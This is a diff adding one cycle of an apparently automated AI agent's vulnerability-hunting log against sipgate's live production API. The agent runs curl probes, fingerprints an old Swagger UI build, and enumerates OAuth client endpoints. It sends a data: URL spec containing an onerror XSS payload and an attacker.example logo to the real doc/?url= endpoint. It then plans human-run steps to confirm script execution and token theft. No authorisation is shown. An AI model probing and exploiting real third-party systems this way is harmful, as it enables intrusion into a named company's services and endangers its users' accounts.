@@ -24083,3 +24083,240 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] sipgate: 40 — No new critical unauthenticated vector. The last high-confidence api lead (oauth2 client list) collapsed to 404; ranked-#1 dev-topology SSRF deflated by port probes (inert). doc/?url= stands as frameable spec-shell + auto-registered extreme-scope implicit client, but script-exec remains HUMAN-unproven (chain-dependent). Reportable set unchanged: /v2/* CORS-cred reflection, doc/?url= frameable spec-shell (MEDIUM), family MISCONFIGs, share1 takeover candidate (HUMAN claim). Data planes uniformly edge-401; no ATO/SSRF/money bug surfaced unauthenticated.
+===== ANALYST bigpickle 2026-09-12 23:27:44 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s "https://api.sipgate.com/v2/doc/swagger-initializer.js" | head -60
+window.onload = function() {
+  //<editor-fold desc="Changeable Configuration Block">
+
+  function getRandomInt(min, max) {
+		min = Math.ceil(min);
+		max = Math.floor(max);
+		return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+
+  var url = window.location.search.match(/url=([^&]+)/);
+  var baseUrl;
+  if (url && url.length > 1) {
+    url = decodeURIComponent(url[1]);
+  } else {
+    var port = /^(80|443)$/.test(window.location.port) || !window.location.port.length ? '' : ':'
+      + window.location.port;
+    baseUrl = "https://" + window.location.hostname + port;
+    url = baseUrl + "/v2/swagger.json";
+  }
+
+  // the following lines will be replaced by docker/configurator, when it runs in a docker-container
+  window.ui = SwaggerUIBundle({
+    oauth2RedirectUrl: baseUrl + "/v2/doc/oauth2-redirect.html",
+    url,
+    dom_id: '#swagger-ui',
+    deepLinking: true,
+    presets: [
+      SwaggerUIBundle.presets.apis,
+      SwaggerUIStandalonePreset
+    ],
+    plugins: [
+      SwaggerUIBundle.plugins.DownloadUrl, OAuthLogoutPlugin
+    ],
+    layout: "StandaloneLayout"
+  });
+
+  window.ui.initOAuth({
+    clientId: "sipgate-swagger-ui",
+    realm: "third-party",
+    appName: "sipgate-swagger-ui",
+    scopeSeparator: " ",
+    additionalQueryStringParams: {nonce: getRandomInt(1000000, 9999999)}
+  });
+
+  //</editor-fold>
+};
+[0m
+[0m$ [0mSPEC='{"openapi":"3.0.0","info":{"title":"t","version":"1","description":"<img src=x onerror=alert(1)>","x-logo":{"url":"https://attacker.example/l.png"}},"paths":{}}'; B64=$(printf '%s' "$SPEC" | base64 -w0); echo "$B64"; echo "----"; curl -s -o /dev/null -D - "https://api.sipgate.com/v2/doc/?url=data:application/json;base64,$B64" | head -20
+eyJvcGVuYXBpIjoiMy4wLjAiLCJpbmZvIjp7InRpdGxlIjoidCIsInZlcnNpb24iOiIxIiwiZGVzY3JpcHRpb24iOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+IiwieC1sb2dvIjp7InVybCI6Imh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9sLnBuZyJ9fSwicGF0aHMiOnt9fQ==
+----
+HTTP/1.1 200 OK
+cache-control: max-age=0
+content-type: text/html; charset=utf-8
+last-modified: Mon, 30 Oct 2023 17:20:29 GMT
+set-cookie: SERVERID=web-apps-web01; path=/; HttpOnly; Secure
+vary: origin
+x-b3-traceid: d8b61fee8b0fa62e50ac46ff0b3d052f
+date: Sat, 12 Sep 2026 23:24:57 GMT
+transfer-encoding: chunked
+[0m
+[0m$ [0mcurl -s -D - -o /dev/null "https://api.sipgate.com/v2/doc/index.html" | head -12; echo "===="; curl -s "https://api.sipgate.com/v2/doc/index.html" | grep -oE 'swagger-ui[^"]*\.js|swagger-ui[^"]*\.css' | head
+HTTP/1.1 200 OK
+cache-control: max-age=0
+content-type: text/html; charset=utf-8
+last-modified: Mon, 30 Oct 2023 17:32:32 GMT
+set-cookie: SERVERID=web-apps-web02; path=/; HttpOnly; Secure
+vary: origin
+x-b3-traceid: f2346d2f372b930320f3f9a123aec023
+date: Sat, 12 Sep 2026 23:25:03 GMT
+transfer-encoding: chunked
+
+====
+swagger-ui.css
+swagger-ui-bundle.js
+swagger-ui-standalone-preset.js
+[0m
+[0m$ [0mcurl -s "https://api.sipgate.com/v2/doc/swagger-ui-bundle.js" | grep -oE 'version:"?[0-9]+\.[0-9]+\.[0-9]+|SwaggerUIBundle [vV]?[0-9.]+|swagger-ui-dist@[^"]*' | head -5
+version:"3.20.3
+version:"17.0.2
+version:"1.3.2
+[0m
+[0m$ [0msleep 1; for p in "/v2/authorization/oauth2/clients/" "/v2/authorization/oauth2/clients/sipgate-app-web" "/v2/doc/oauth2-redirect.html"; do code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com$p"); echo "$code $p"; sleep 1; done
+401 /v2/authorization/oauth2/clients/
+400 /v2/authorization/oauth2/clients/sipgate-app-web
+200 /v2/doc/oauth2-redirect.html
+[0m
+[0m$ [0mcode=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com/v2/swagger.json"); echo "$code /v2/swagger.json"; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com/v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000"); echo "$code /v2/authorization/oauth2/clients/{nil-uuid}"
+200 /v2/swagger.json
+500 /v2/authorization/oauth2/clients/{nil-uuid}
+[0m
+[0m$ [0mcurl -s "https://api.sipgate.com/v2/swagger.json" -o /tmp/opencode/swagger.json; python3 -c "
+import json
+d=json.load(open('/tmp/opencode/swagger.json'))
+paths=d.get('paths',{})
+print('path_count',len(paths))
+o=[p for p in paths if 'oauth2' in p]
+print('oauth2 paths',o)
+print('global_security',d.get('security'))
+for p in o:
+    for m,op in paths[p].items():
+        print(p,m,'security=',op.get('security'),'auth.schemes=',list(d.get('components',{}).get('securitySchemes',{}) or {}))
+"
+path_count 144
+oauth2 paths ['/authorization/oauth2/clients', '/authorization/oauth2/clients/{clientId}', '/authorization/oauth2/clients/{clientId}/gdpr']
+global_security None
+/authorization/oauth2/clients get security= [{'oauth2': ['all', 'authorization:oauth2:clients:read']}] auth.schemes= []
+/authorization/oauth2/clients post security= [{'oauth2': ['all', 'authorization:oauth2:clients:write']}] auth.schemes= []
+/authorization/oauth2/clients/{clientId} delete security= [{'oauth2': ['all', 'authorization:oauth2:clients:write']}] auth.schemes= []
+/authorization/oauth2/clients/{clientId} get security= [{'oauth2': ['all', 'authorization:oauth2:clients:read']}] auth.schemes= []
+/authorization/oauth2/clients/{clientId} put security= [{'oauth2': ['all', 'authorization:oauth2:clients:write']}] auth.schemes= []
+/authorization/oauth2/clients/{clientId}/gdpr get security= None auth.schemes= []
+[0m
+[0m$ [0msleep 1; for id in "00000000-0000-0000-0000-000000000000" "sipgate-app-web" "me"; do code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com/v2/authorization/oauth2/clients/$id/gdpr"); echo "$code gdpr/$id"; sleep 1; done
+500 gdpr/00000000-0000-0000-0000-000000000000
+400 gdpr/sipgate-app-web
+400 gdpr/me
+[0m
+[0m$ [0mpython3 -c "
+import json
+d=json.load(open('/tmp/opencode/swagger.json'))
+op=d['paths']['/authorization/oauth2/clients/{clientId}/gdpr']['get']
+print(json.dumps(op,indent=1)[:800])
+"; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com/v2/authorization/oauth2/clients/01234567-89ab-cdef-0123-456789abcdef/gdpr"); echo "$code gdpr/random-uuid"
+{
+ "operationId": "getGdprUrls",
+ "parameters": [
+  {
+   "description": "The unique OAuth 2.0 client identifier",
+   "in": "path",
+   "name": "clientId",
+   "required": true,
+   "type": "string"
+  }
+ ],
+ "produces": [
+  "application/json"
+ ],
+ "responses": {
+  "200": {
+   "description": "Success",
+   "schema": {
+    "$ref": "#/definitions/GdprUrls"
+   }
+  }
+ },
+ "summary": "Get GDPR urls for specific OAuth 2.0 client",
+ "tags": [
+  "authorization"
+ ],
+ "x-accepts": "application/json",
+ "x-contentType": "application/json"
+}
+400 gdpr/random-uuid
+[0m
+[0m$ [0mpython3 -c "
+import json
+d=json.load(open('/tmp/opencode/swagger.json'))
+paths=d.get('paths',{})
+for p in sorted(paths):
+    for m,op in paths[p].items():
+        sec=op.get('security')
+        if sec is None:
+            print(p.upper() if p=='/'+p.split('/')[1] else p, m, 'SECURITY_ABSENT')
+"
+/ get SECURITY_ABSENT
+/app/links get SECURITY_ABSENT
+/authorization/oauth2/clients/{clientId}/gdpr get SECURITY_ABSENT
+/authorization/userinfo get SECURITY_ABSENT
+/translations/{language} get SECURITY_ABSENT
+[0m
+[0m$ [0mfor p in "/authorization/userinfo" "/app/links" "/"; do code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.sipgate.com/v2$p"); echo "$code /v2$p"; sleep 1; done
+401 /v2/authorization/userinfo
+401 /v2/app/links
+404 /v2/
+[0m
+[0m$ [0mfor p in "/authorization/oauth2/clients/" "/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000" "/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/gdpr"; do out=$(curl -s -D - -o /dev/null "https://api.sipgate.com/v2$p" | grep -iE "^(HTTP|set-cookie: SERVERID)"); echo "$out $p"; echo "--"; sleep 1; done
+HTTP/1.1 401 Unauthorized
+ /authorization/oauth2/clients/
+--
+HTTP/1.1 500 Internal Server Error
+ /authorization/oauth2/clients/00000000-0000-0000-0000-000000000000
+--
+HTTP/1.1 500 Internal Server Error
+ /authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/gdpr
+--
+[0m
+[0m$ [0mfor i in 1 2 3; do curl -s -D - -o /dev/null "https://api.sipgate.com/v2/authorization/oauth2/clients/00000000-0000-0000-0000-000000000000/gdpr" | grep -i "SERVERID" ; sleep 1; done
+(no output)
+[0m
+STEP 1 — DELTA
+- CHANGED `api.sipgate.com/v2/authorization/oauth2/clients/*`: flapped back LIVE — list `401` (edge-auth enforced), `{string}`-leaf `400`, `{nil-UUID}`-leaf `500`, `{nil-UUID}/gdpr` `500`/`{string}` `400`. Last cycle's 404s ("endpoint removed") are overturned; gap is reproducible across cycles → route/replica flapping, not removal.
+- CHANGED `api.sipgate.com/v2/swagger.json`: 404→200 again (144 paths); spec-declared-public ops = {`/`, `/app/links`, `/userinfo`, `/translations/{lang}`, `/oauth2/clients/{id}/gdpr`}; gdpr GET has `security: ABSENT` and a 200 `GdprUrls` JSON schema.
+- CONFIRMED `api.sipgate.com/v2/doc/?url=data:application/json;base64,…` → 200 `text/html` shell; `swagger-initializer.js` unchanged (no URL scheme/host allowlist, auto-registers `sipgate-swagger-ui`/`third-party` extreme-scope implicit client).
+
+STEP 2 — PRIORITIZE
+- [PRIO] `api.sipgate.com/v2/authorization/oauth2/clients/{clientId}[/gdpr]`, 5.8, axis=a6 b6 t7 g4 c2 f9 → only spec-security-absent op that bypasses edge-auth (500/400 unauth vs 401 elsewhere)
+- [PRIO] `api.sipgate.com/v2/doc/?url=`, 5.7, axis=a5 b6 t7 g8 c2 f5 → frameable spec-shell + extreme-scope implicit client, exec HUMAN-unproven
+- [PRIO] `/v2/swagger.json` spec-drift set, 4.8, axis=a6 b4 t5 g6 c2 f8 → 4/5 declared-public ops edge-401/404; only gdpr anomalous
+
+STEP 3 — HYPOTHESES
+[HYP] OAuth client GDPR-URL leaf: unauthenticated app-plane reach (edge auth not uniform; spec security:None)
+class: AUTH
+asset: api.sipgate.com/v2/authorization/oauth2/clients/{clientId}/gdpr
+confidence: 55
+reasoning: swagger.json live (144 paths) declares gdpr GET with security ABSENT returning 200 GdprUrls JSON; unauthenticated nil-UUID → 500 (handler/DB reach), non-nil-UUID/string/me → 400, sibling list → 401 (edge enforced); reproduced 2026-09-11 + 2026-09-12×2, absent only in the single flapped-404 cycle; bodies empty in every class; no SERVERID header on error leaves (replica signal inconclusive).
+evidence_needed: any real registered OAuth client UUID returning 200 + GdprUrls body without Authorization header, or any non-empty body unauthenticated.
+verify_steps: AUTH_HELPED — with a real client UUID GET `/v2/authorization/oauth2/clients/<uuid>/gdpr`; passively, re-sample statuses each cycle to track flapping (version-skew gate).
+impact: LOW standalone (empty bodies, no UUID oracle, no data feed); auth-consistency/spec-vs-behavior drift on a GDPR-named endpoint = hardening + chain material; meaningful only if a client UUID is later obtained.
+testability: AUTH_HELPED
+[HYP] Attacker-spec render on api origin via doc/?url= (frameable, extreme-scope implicit OAuth client)
+class: XSS
+asset: api.sipgate.com/v2/doc/?url=
+confidence: 48
+reasoning: re-confirmed unchanged this cycle — data: spec served 200 text/html; initializer feeds decodeURIComponent(url[1]) into SwaggerUIBundle with no allowlist; initOAuth registers sipgate-swagger-ui (realm third-party, scopes incl oauth2-clients:write/balance:read/payment:methods:*) on every load; no XFO/frame-ancestors on doc shell; oauth2RedirectUrl fixed same-origin.
+evidence_needed: attacker spec markup (info.description / info.x-logo.url) rendering in api-origin DOM; any script exec; iframe-embed from attacker page.
+verify_steps: HUMAN_ONLY — fresh Chromium, `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` with description `<img src=x onerror=alert(document.domain)>`; repeat with `https://<attacker>/spec.json`.
+impact: CRITICAL if script executes (api-scope session via implicit token + CORS-cred); else MEDIUM phishing amplifier on trusted origin.
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] List-endpoint auth-bypass (conf 85 legacy): dead this cycle — list is 401 edge-gated; drop.
+- [PARKED] `doc/?url=` exec proof: server facts re-confirmed but evidence is browser-only; previously NEXTed, unchanged → keep as the sole escalation-ready api chain.
+- [FINAL] GDpr leaf app-plane reach (this cycle's only new reproducible datum; AUTH_HELPED for data) — ranked top for api target.
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Fresh Chromium (no cookies): open `https://api.sipgate.com/v2/doc/?url=data:application/json;base64,<spec>` where spec = OpenAPI3 with `info.description`=`<img src=x onerror=alert(document.domain)>` and `info.x-logo.url=https://<attacker>/l.png`; then again with `https://<attacker>/spec.json`. Report (a) attacker markup in api-origin DOM, (b) script executes, (c) `/v2/doc/` embeds in attacker iframe. Decides CRITICAL-vs-MEDIUM for the only remaining high-value api chain.
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED AUTH @ `api.sipgate.com/v2/authorization/oauth2/clients/{clientId}` subtree: unauthenticated nil-UUID → 500 while sibling list → 401; gdpr leaf spec-declared security:None; reproducible across cycles, absent only during flapped-404 cycle; no data leak unauthenticated (empty bodies), requires real client UUID (AUTH_HELPED).
+
+STEP 7 — RISK
+[RISK] sipgate: 40 — No new critical unauth vector. The oauth2-clients/gdpr subtree is real, reproducible edge-auth drift on a GDPR-named endpoint, but data-less without a client UUID. doc/?url= stands as frameable spec-shell + extreme-scope implicit client, HUMAN-gated for exec. Reportable set unchanged: `/v2/*` CORS-cred reflection (now incl. oauth2 client CRUD list), doc/?url= chain (MEDIUM/CRITICAL-HUMAN), family MISCONFIGs, share1 takeover candidate. Data planes otherwise uniform edge-401.
